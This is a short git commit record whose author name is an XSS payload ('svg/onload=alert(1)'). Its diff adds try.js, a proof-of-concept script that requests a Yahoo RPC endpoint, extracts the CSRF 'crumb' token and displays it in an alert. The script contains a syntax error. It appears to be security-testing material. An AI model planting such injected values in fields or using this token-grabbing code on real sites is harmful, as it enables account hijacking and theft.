20af1d60042ee5b4142b07be70681f24813083ad
svg/onload=alert(1) <mangoiscat@gmail.com>
2017-09-01 16:22:48 +0000

    bull.js

---
+++ try.js
@@ -0,0 +1,5 @@
+var url="https://prod.iris.yahoo.com/prod/rpc?v=8&crumb=";
+var fetch= new XMLHttpRequest();
+fetch.onreadystatechange= function(){if(fetch.readyState == fetch.DONE) {request_data = JSON.parse(fetch.responseText);var crumb= request_data.crumb;alert(crumb;);}}
+fetch.open("POST",url,false);
+fetch.send();
